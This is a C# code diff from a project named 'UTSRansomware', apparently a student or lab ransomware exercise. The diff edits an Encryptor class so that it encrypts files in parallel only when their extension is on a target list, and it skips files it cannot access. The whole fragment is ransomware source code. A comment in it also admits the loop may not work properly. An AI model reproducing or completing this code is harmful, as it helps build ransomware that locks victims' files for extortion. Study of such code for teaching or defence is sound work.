@@ -14,6 +14,8 @@ namespace UTSRansomware
         public byte[] key;
         public byte[] iv;
 
+
+
         // Constructor to generate new key and IV
         public Encryptor()
         {
@@ -72,20 +74,23 @@ namespace UTSRansomware
             // Don't think this is working properly so will have to fix
             Parallel.ForEach(filePaths, (filePath) =>
             {
-                try
+                string fileExtension = Path.GetExtension(filePath);
+                if (Utils.fileExtensions.Contains(fileExtension))
                 {
-                    EncryptFile(filePath);
-                }
-                catch (UnauthorizedAccessException)
-                {
-                    Console.WriteLine($"Access denied to: {filePath}. Skipping...");
-                }
+                    try
+                    {
+                        EncryptFile(filePath);
+                    }
+                    catch (UnauthorizedAccessException)
+                    {
+                        Console.WriteLine($"Access denied to: {filePath}. Skipping...");
+                    }
 
-                catch (Exception ex)
-                {
-                    Console.WriteLine(ex.ToString());
+                    catch (Exception ex)
+                    {
+                        Console.WriteLine(ex.ToString());
+                    }
                 }
-
             });
         }
 
